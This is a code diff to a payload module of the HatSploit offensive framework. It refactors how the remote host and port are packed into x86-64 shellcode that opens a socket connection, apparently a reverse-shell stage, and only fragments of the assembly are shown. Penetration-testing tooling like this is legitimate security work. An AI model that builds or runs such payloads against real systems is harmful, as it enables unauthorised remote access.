@@ -6,10 +6,9 @@ Current source: https://github.com/EntySec/HatSploit
 from hatsploit.lib.payload.basic import *
 
 from pex.assembler import Assembler
-from pex.socket import Socket
 
 
-class HatSploitPayload(Payload, Handler, Assembler, Socket):
+class HatSploitPayload(Payload, Handler, Assembler):
     def __init__(self):
         super().__init__()
 
@@ -55,9 +54,6 @@ class HatSploitPayload(Payload, Handler, Assembler, Socket):
         )
 
     def run(self):
-        host = self.pack_host(self.rhost.value)
-        port = self.pack_port(self.rport.value)
-
         return self.assemble(
             self.details['Arch'],
             f"""
@@ -72,7 +68,7 @@ class HatSploitPayload(Payload, Handler, Assembler, Socket):
                 syscall
 
                 xchg rdi, rax
-                movabs rcx, 0x{host.hex()}{port.hex()}0002
+                movabs rcx, 0x{self.rhost.little.hex()}{self.rport.little.hex()}0002
                 push rcx
                 mov rsi, rsp
                 push 0x10
